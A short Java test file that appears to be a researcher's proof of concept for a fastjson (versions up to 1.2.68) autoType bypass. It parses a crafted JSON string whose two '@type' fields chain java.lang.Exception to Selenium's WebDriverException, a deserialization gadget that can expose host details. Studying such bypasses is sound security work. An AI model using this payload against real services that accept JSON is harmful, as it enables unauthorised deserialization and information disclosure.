package com.mechoy;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.openqa.selenium.WebDriverException;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;

/**
 * Author  Mechoy
 * Version 1.0
 * Date
 * Description fastjson<=1.2.68 bypass
 */
public class fastjsonTest2 {
    public static void main(String[] args) {
        String s = "{\"@type\":\"java.lang.Exception\", \"@type\":\"org.openqa.selenium.WebDriverException\"}";

        JSONObject jsonObject = JSON.parseObject(s);
        System.out.println(jsonObject);


    }
}
